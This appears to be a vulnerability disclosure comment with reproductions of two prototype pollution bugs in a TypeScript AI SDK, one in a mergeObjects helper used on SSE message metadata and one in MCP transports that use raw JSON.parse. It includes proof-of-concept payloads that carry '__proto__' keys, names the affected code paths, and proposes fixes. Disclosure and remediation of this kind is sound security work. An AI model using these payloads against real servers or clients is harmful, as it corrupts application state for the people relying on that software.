Hi — here's a concrete reproduction for both findings:

### 1. mergeObjects prototype pollution

```typescript
import { mergeObjects } from 'ai/src/util/merge-objects';

// Simulates a crafted SSE chunk with __proto__ as own property
const malicious = JSON.parse('{"__proto__": {"polluted": true}, "safe": "value"}');

// Before merge
console.log(({} as any).polluted); // undefined

const result = mergeObjects({}, malicious);

// Check if Object.prototype was polluted
console.log(({} as any).polluted); // true (if pollution succeeded)
// OR check result directly:
console.log(result.__proto__); // { polluted: true }
```

This is reachable via `process-ui-message-stream.ts:334` where `messageMetadata` from SSE stream chunks is merged using `mergeObjects()`. A malicious server-side stream can include `__proto__` in the metadata field.

### 2. MCP transport JSON.parse

```typescript
// In mcp-sse-transport.ts, line ~78:
// const message = JSON.parse(event.data) as JSONRPCMessage;
//
// If event.data from an MCP server contains:
const payload = '{"jsonrpc":"2.0","id":1,"result":{"__proto__":{"polluted":true}}}';
const parsed = JSON.parse(payload);
// parsed.__proto__ is an own property = { polluted: true }
// Any subsequent spread/merge of this object risks prototype pollution
//
// Fix: use secureJsonParse() which is already in the codebase at
// packages/provider-utils/src/secure-json-parse.ts
```

The fix for both is straightforward — `mergeObjects` needs a `__proto__`/`constructor`/`prototype` key filter (3 lines), and MCP transports should use the existing `secureJsonParse()` instead of raw `JSON.parse()`.

